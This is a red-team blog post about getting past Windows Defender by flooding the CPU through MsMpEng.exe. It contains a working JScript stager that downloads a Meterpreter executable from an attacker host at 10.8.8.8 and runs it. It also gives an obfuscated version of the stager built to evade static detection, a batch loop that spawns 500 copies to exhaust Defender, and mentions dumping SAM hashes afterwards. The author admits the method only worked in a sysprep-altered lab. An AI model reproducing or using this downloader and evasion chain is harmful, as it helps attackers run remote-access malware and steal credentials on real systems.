# ---
# title: Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe 
# date: 2025-07-12 +/-TTTT
# categories: [REDTEAM]
# tags: [evasion,meterpreter]
# ---

## Important Note
This technique was found to work only on Ludus Lab with `sysprep` enabled, which could potentially damage some Windows components and change their behavior, including security features. In Ludus, the relevant line in the config is:

    windows:            # This key must be set for windows VMs - all subkeys are optional  
      sysprep: false    # Set to true to run sysprep before any other tasks on this VM. Default: false

I discovered this after writing this fancy blog, but I still wanted to keep it as is. The lesson learned from this experience is to avoid using this feature for future research.

---

## JS Launcher

This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors.

To download a Meterpreter payload to the disk, we will use `cscript.exe` by creating a `downloader.js` file and double-clicking it.

```js
var url = "http://10.8.8.8/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200) {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

Both the JS script and the downloaded Meterpreter payload are detected statically before execution.

The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/.

The resulting script will look like this:

```js
var _0x17d249=_0x1fcc;(function(_0x8d99f4,_0x5b012c){var _0x2cbcff=_0x1fcc,_0x176630=_0x8d99f4();while(!![]){try{var _0x516bb3=-parseInt(_0x2cbcff(0x1f5))/0x1+-parseInt(_0x2cbcff(0x1ec))/0x2+-parseInt(_0x2cbcff(0x1e5))/0x3*(parseInt(_0x2cbcff(0x1f2))/0x4)+parseInt(_0x2cbcff(0x1e7))/0x5+-parseInt(_0x2cbcff(0x1e6))/0x6*(-parseInt(_0x2cbcff(0x1f3))/0x7)+parseInt(_0x2cbcff(0x1ef))/0x8+-parseInt(_0x2cbcff(0x1ea))/0x9*(-parseInt(_0x2cbcff(0x1f1))/0xa);if(_0x516bb3===_0x5b012c)break;else _0x176630['push'](_0x176630['shift']());}catch(_0x444b68){_0x176630['push'](_0x176630['shift']());}}}(_0x4958,0x52d5f));var url=_0x17d249(0x1f8),Object=WScript[_0x17d249(0x1e4)]('MSXML2.XMLHTTP');Object['Open'](_0x17d249(0x1f6),url,![]),Object['Send']();if(Object[_0x17d249(0x1e8)]==0xc8){var Stream=WScript['CreateObject'](_0x17d249(0x1ee));Stream[_0x17d249(0x1f0)](),Stream[_0x17d249(0x1e9)]=0x1,Stream[_0x17d249(0x1f4)](Object[_0x17d249(0x1f9)]),Stream[_0x17d249(0x1eb)]=0x0,Stream[_0x17d249(0x1f7)]('met.exe',0x2),Stream['Close']();}var r=new ActiveXObject(_0x17d249(0x1fa))[_0x17d249(0x1ed)]('met.exe');function _0x1fcc(_0x5aab95,_0x3af232){var _0x495812=_0x4958();return _0x1fcc=function(_0x1fcc18,_0xbf485){_0x1fcc18=_0x1fcc18-0x1e4;var _0xf5897c=_0x495812[_0x1fcc18];return _0xf5897c;},_0x1fcc(_0x5aab95,_0x3af232);}function _0x4958(){var _0x88af5=['174024sBDVKk','6aCgHFV','2711895TrvrLm','Status','Type','9307413HbmAyM','Position','792432hvPFro','Run','ADODB.Stream','470216MBGiiE','Open','10fGQDlo','36dgRipP','779387TmqUOV','Write','489071HUhQcm','GET','SaveToFile','http://10.8.8.8/met.exe','ResponseBody','WScript.Shell','CreateObject'];_0x4958=function(){return _0x88af5;};return _0x4958();}
```

Save it on the desktop as `obf.js` and attempt to execute it.

Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security.


## Overloading the CPU

![Catfender](https://i.imgur.com/5TR2Szu.png)

To successfully execute Meterpreter with this technique, we need to spam multiple `cscript.exe` processes running our `obf.js` script, which will exhaust the CPU due to Defender's `MsMpEng.exe` process.

This time, we will create a separate `launcher.bat` script that spawns multiple instances of our malicious JS payload execution via a for loop.

```bat
@echo off
for /l %%i in (1,1,500) do (
    cscript //nologo obf.js
)
```

We can execute this batch script multiple times and wait a few seconds.

<div style="text-align: center;">
  <video width="100%" height="auto" controls playsinline webkit-playsinline x-webkit-airplay="allow" style="max-width: 640px;">
    <source src="https://i.imgur.com/Cr8xbD4.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations.

---

